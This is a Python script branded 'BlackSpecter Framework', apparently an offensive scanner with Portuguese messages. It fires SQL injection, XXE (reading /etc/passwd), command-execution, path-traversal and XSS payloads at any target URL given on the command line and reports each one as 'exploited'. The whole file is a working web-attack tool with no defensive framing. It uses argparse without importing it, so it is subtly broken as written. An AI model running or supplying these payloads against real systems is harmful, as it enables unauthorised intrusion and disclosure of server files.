ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                    
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
 ███████████  █████░░████████░░██████  ████ █████                    
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
                                                                     
                                                                     
                                                                     
  █████████                               █████                       
 ███░░░░░███                             ░░███                        
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████ 
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░ 
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███     
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████    
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░    
             ░███                                                   
             █████                                                  
            ░░░░░                                                   
'''

import requests
import urllib.parse

def log_info(msg):
    print(f"[INFO] {msg}")

def log_success(msg):
    print(f"[SUCESSO] {msg}")

def log_error(msg):
    print(f"[ERRO] {msg}")

class SQLiAutoExploit:
    def __init__(self, target, param='id', path='/vulnerable.php'):
        self.target = target.rstrip('/')
        self.param = param
        self.path = path
    def run(self):
        url = f"{self.target}{self.path}"
        payloads = ["1' OR '1'='1", "1' UNION SELECT NULL--", "' OR 1=1--"]
        for payload in payloads:
            data = {self.param: payload}
            try:
                r = requests.get(url, params=data, timeout=10)
                if 'syntax' not in r.text.lower() and r.status_code == 200:
                    log_success(f"SQLi possível detectada com payload: {payload}")
                    return True
            except Exception as e:
                log_error(f"Erro na requisição SQLi: {e}")
        log_info("Nenhuma vulnerabilidade SQLi detectada.")
        return False

class XXEExploit:
    def __init__(self, target, path='/upload', param='xml'):
        self.target = target.rstrip('/')
        self.path = path
        self.param = param
    def run(self):
        url = f"{self.target}{self.path}"
        xxe_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [  
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>'''
        headers = {'Content-Type': 'application/xml'}
        try:
            r = requests.post(url, data=xxe_payload, headers=headers, timeout=10)
            if 'root:' in r.text:
                log_success("XXE vulnerável detectado e explorado!")
                return True
        except Exception as e:
            log_error(f"Erro na requisição XXE: {e}")
        log_info("Nenhuma vulnerabilidade XXE detectada.")
        return False

class RCEExploit:
    def __init__(self, target, path='/vuln', param='cmd'):
        self.target = target.rstrip('/')
        self.path = path
        self.param = param
    def run(self):
        url = f"{self.target}{self.path}"
        payload = 'id'
        try:
            r = requests.get(url, params={self.param: payload}, timeout=10)
            if 'uid=' in r.text or 'gid=' in r.text:
                log_success("RCE possível detectado e explorado!")
                return True
        except Exception as e:
            log_error(f"Erro na requisição RCE: {e}")
        log_info("Nenhuma vulnerabilidade RCE detectada.")
        return False

class LFIAttack:
    def __init__(self, target, path='/vuln', param='file'):
        self.target = target.rstrip('/')
        self.path = path
        self.param = param
    def run(self):
        url = f"{self.target}{self.path}"
        payloads = ['../../../../etc/passwd', '../../etc/passwd', '/etc/passwd']
        for payload in payloads:
            try:
                r = requests.get(url, params={self.param: payload}, timeout=10)
                if 'root:' in r.text:
                    log_success(f"LFI detectado com payload: {payload}")
                    return True
            except Exception as e:
                log_error(f"Erro na requisição LFI: {e}")
        log_info("Nenhuma vulnerabilidade LFI detectada.")
        return False

class XSSAttack:
    def __init__(self, target, path='/', param='q'):
        self.target = target.rstrip('/')
        self.path = path
        self.param = param
    def run(self):
        url = f"{self.target}{self.path}"
        payload = '<script>alert(1)</script>'
        try:
            r = requests.get(url, params={self.param: payload}, timeout=10)
            if payload in r.text:
                log_success("XSS detectado e explorado!")
                return True
        except Exception as e:
            log_error(f"Erro na requisição XSS: {e}")
        log_info("Nenhuma vulnerabilidade XSS detectada.")
        return False

def main():
    print(ASCII_ART)
    parser = argparse.ArgumentParser(description='BlackSpecter Framework - Exploits Multi-Vulnerabilidades')
    parser.add_argument('target', help='URL alvo (ex: http://example.com)')
    args = parser.parse_args()
    target = args.target

    modules = [
        SQLiAutoExploit(target),
        XXEExploit(target),
        RCEExploit(target),
        LFIAttack(target),
        XSSAttack(target)
    ]

    for module in modules:
        log_info(f"Executando módulo: {module.__class__.__name__}")
        result = module.run()
        if result:
            log_success(f"{module.__class__.__name__} explorado com sucesso.")
        else:
            log_info(f"{module.__class__.__name__} não explorado.")

if __name__ == "__main__":
    main()

